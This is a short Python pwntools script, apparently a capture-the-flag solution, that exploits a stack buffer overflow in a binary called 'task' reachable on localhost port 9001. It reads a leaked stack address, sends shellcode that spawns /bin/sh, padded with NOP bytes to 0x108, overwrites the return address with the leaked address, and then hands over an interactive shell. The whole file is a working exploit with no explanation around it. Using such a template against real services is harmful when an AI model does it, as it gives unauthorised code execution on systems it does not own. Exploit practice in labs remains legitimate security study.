#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

leak = int(p.readline().decode(), 16)

p.sendline(asm(shellcraft.sh()).ljust(0x108, b"\x90") + p64(leak))

p.interactive()
